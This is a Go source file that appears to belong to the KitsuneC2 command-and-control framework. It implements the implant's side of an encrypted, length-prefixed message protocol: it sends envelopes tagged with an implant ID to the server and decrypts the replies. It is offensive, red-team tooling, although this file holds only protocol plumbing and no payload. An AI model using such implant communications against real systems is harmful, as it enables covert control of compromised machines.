package main

import (
	"KitsuneC2/lib/communication"
	"KitsuneC2/lib/cryptography"
	"bytes"
	"encoding/binary"
	"encoding/json"
	"errors"
	"net"
	"reflect"
)

// Works almost exactly the same as the function "SendevelopeToImplant", the only difference being that this function includes the "implantId"
// parameter. This parameter needs to be of md5 format(length==32). This parameter is used by the server to identify which implant is trying to
// communicate with it.
func SendEnvelopeToServer(connection net.Conn, implantId string, messageType int, data interface{}, aesKey []byte) error {
	if len(implantId) != 32 {
		return errors.New("implantId is not 32 bytes")
	}

	encryptedJson, err := communication.PackAndEncryptEnvelope(messageType, data, aesKey)
	if err != nil {
		return err
	}

	//create a buffer and write the len(encryptedData + implantId) + encryptedData into it
	buffer := new(bytes.Buffer)
	binary.Write(buffer, binary.LittleEndian, uint32(len(encryptedJson)+len(implantId)))
	buffer.Write([]byte(implantId))
	buffer.Write(encryptedJson)

	err = communication.WriteToSocket(connection, buffer.Bytes())
	if err != nil {
		return err
	}

	return nil
}

// Reads the first 4 bytes (uint32) from socket (message length). The reads the entire encrypted message. Afterwards, the function decrypts the message
// and attempts to unmarshal the resulting JSON into a Envelope object.
func ReceiveEnvelopeFromServer(connection net.Conn, aesKey []byte) (int, interface{}, error) {
	messageLengthAsBytes, err := communication.ReadFromSocket(connection, 4)
	if err != nil {
		return -1, nil, err
	}
	messageLength := binary.LittleEndian.Uint32(messageLengthAsBytes)

	cipherText, err := communication.ReadFromSocket(connection, int(messageLength))
	if err != nil {
		return -1, nil, err
	}
	rawJsonAsBytes, err := cryptography.DecryptAes(cipherText, []byte(aesKey))
	if err != nil {
		return -1, nil, err
	}

	var messageEnvelope *communication.Envelope = new(communication.Envelope)
	json.Unmarshal(rawJsonAsBytes, messageEnvelope)

	dataAsStruct := communication.MessageTypeToStruct[messageEnvelope.MessageType]()
	err = json.Unmarshal(messageEnvelope.Data, dataAsStruct)
	if err != nil {
		return -1, nil, errors.New("data does not correspond to messageType")
	}

	//use reflection to check that MessageType and data correspond correctly.
	expectedType := reflect.TypeOf(communication.MessageTypeToStruct[messageEnvelope.MessageType]())
	dataType := reflect.TypeOf(dataAsStruct)
	if !dataType.AssignableTo(expectedType) && !reflect.PointerTo(dataType).AssignableTo(expectedType) {
		return -1, nil, errors.New("data does not correspond to messageType")
	}

	return messageEnvelope.MessageType, dataAsStruct, nil
}
